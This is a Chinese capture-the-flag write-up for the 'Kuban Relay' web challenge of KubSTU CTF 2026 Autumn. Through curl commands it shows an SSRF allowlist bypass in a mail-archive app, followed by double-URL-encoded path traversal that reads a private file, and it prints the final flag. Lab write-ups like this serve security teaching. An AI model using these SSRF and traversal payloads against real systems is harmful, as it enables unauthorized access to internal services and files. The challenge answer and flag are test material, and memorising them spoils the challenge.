# Kuban Relay

> **分类：** Web · **赛事：** KubSTU CTF 2026 Autumn
> Write-up：KubMail —— 记住一切的归档

## 📌 题目

KubMail 是一个集成邮件/归档服务。flag 要从公开页面入手获取：没有单一的「魔法」请求——把 `/api/preview` 接口中的 SSRF 与内部 archive gateway 中双重 URL 解码导致的 path traversal 串起来，从而读取一个私有的备份文件。

**附件：** [KubMail_CTF (1).zip](../../../assets/Web/Kuban%20Relay/KubMail_CTF%20%281%29.zip)

## 🏁 解题思路

### 1. 利用链

本题不是靠一个请求解决的，而是靠一条链：

```text
публичная страница
  → /api/docs
  → /api/preview (SSRF)
  → /internal/health
  → /internal/debug/routes
  → ticket tram-7-archive
  → /internal/archive/export
  → двойное URL-декодирование
  → path traversal
  → flag
```

### 2. 侦察

主页上有一个 **API 文档** 链接。请求：

```bash
curl http://127.0.0.1:5000/api/docs
```

返回：

```json
{
  "name": "KubMail integration API",
  "version": "2.3",
  "endpoints": {
    "preview": "/api/preview?url=<URL>",
    "route": "/api/route?from=&to="
  },
  "preview_note": "Preview accepts approved kubmail.local integration URLs."
}
```

文档中还有一条不暴露源码的提示：

```json
"legacy_monitoring": {
  "health_probe": "/internal/health",
  "purpose": "archive gateway availability check"
}
```

这使得本题可以用 blackbox 方法求解：health probe 路由无需猜测或暴力枚举。`/api/preview` 接口很值得注意：服务器会亲自向用户提供的 URL 发起一个 HTTP 请求。这是 SSRF 的特征。

### 3. 绕过 allowlist

应用里的检查是这样写的：

```python
if 'kubmail.local' not in target:
    return jsonify({'error':'destination is not on the approved integration network'}), 403
```

它检查的是整个 URL 字符串，而不是 hostname。因此可以把 `kubmail.local` 放进 URL 的 query 参数里，而真正的目标仍然是 localhost：

```text
http://127.0.0.1:5000/internal/health?via=kubmail.local
```

对代理发起的外部请求：

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/health?via=kubmail.local'
```

响应：

```json
{
  "body": "{\"build\":\"2024.03.17\",\"note\":\"legacy export requires a gateway ticket\",\"routes\":\"/internal/debug/routes\",\"service\":\"krd-archive-gateway\",\"status\":\"ok\"}\n",
  "status": 200
}
```

### 4. 访问 debug 接口

从响应中我们得知了路径 `/internal/debug/routes`。我们通过同一个 SSRF 来执行它：

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/debug/routes?via=kubmail.local'
```

响应中包含了内部路由和 ticket：

```json
{
  "export": {
    "method": "GET",
    "parameter": "name",
    "ticket": "tram-7-archive"
  },
  "routes": [
    "/internal/health",
    "/internal/debug/routes",
    "/internal/archive/export"
  ]
}
```

还可以看到，内部接口信任 `X-Kubmail-Proxy` 头，而 SSRF 代理会自动加上它。

### 5. 分析 archive export

`/internal/archive/export` 接口需要一个 ticket 和一个 `name` 参数：

```python
if request.args.get('ticket') != 'tram-7-archive':
    return jsonify({'error':'invalid gateway ticket'}),401

raw = request.args.get('name','')
name = unquote(raw)
target = (PUBLIC_DIR / name).resolve()
```

这里重复了额外解码的那个错误。与普通的 `/download` 不同，内部 export 并不校验最终路径是否仍在 `data/public` 之内。

### 6. 最终的 traversal

我们需要从 `data/public` 跳出到 `data/private`，并请求：

```text
data/private/krd_weather_backup.txt
```

为此，我们传入这个名字：

```text
%252e%252e%252fprivate%252fkrd_weather_backup.txt
```

内部接口必须同时收到 `ticket`、`name` 以及 `kubmail.local` 标记，才能通过外层代理的 allowlist。最方便的做法是对嵌套 URL 内部的 & 符号进行 URL 编码：

```text
http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local
```

完整命令：

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local'
```

在 query 参数被解码之后，内部请求变为：

```text
/internal/archive/export?ticket=tram-7-archive&name=%2e%2e%2fprivate%2fkrd_weather_backup.txt&via=kubmail.local
```

Flask 在第一层解码 `%25`，而 archive gateway 中的 `unquote()` 执行第二阶段，把名字变成：

```text
../private/krd_weather_backup.txt
```

路径归一化得到：

```text
data/public/../private/krd_weather_backup.txt
→ data/private/krd_weather_backup.txt
```

### 7. Flag

在响应中找到：

```text
KubSTU{kuban_legacy_gateway_reads_between_the_lines}
```

**Flag:** `KubSTU{kuban_legacy_gateway_reads_between_the_lines}`
